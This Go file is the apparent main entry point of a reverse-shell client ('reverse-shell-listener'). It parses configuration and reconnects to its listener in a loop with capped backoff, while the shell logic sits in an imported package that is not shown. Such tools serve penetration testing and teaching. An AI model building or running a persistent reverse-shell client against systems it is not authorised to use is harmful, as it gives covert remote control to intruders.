package main

import (
	"context"
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/nemanjan00/reverse-shell-listener/client"
)

func main() {
	cfg, err := client.ParseConfig(os.Args[1:])
	if err != nil {
		fmt.Fprintln(os.Stderr, client.Usage())
		os.Exit(1)
	}

	ctx, stop := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer stop()

	attempt := 0
	for {
		attempt++
		err := client.Run(ctx, cfg)
		select {
		case <-ctx.Done():
			return
		default:
		}
		log.Printf("[client] connection lost: %v", err)
		d := time.Duration(attempt) * time.Second
		if d > 30*time.Second {
			d = 30 * time.Second
		}
		log.Printf("[client] reconnecting in %s", d)
		time.Sleep(d)
	}
}
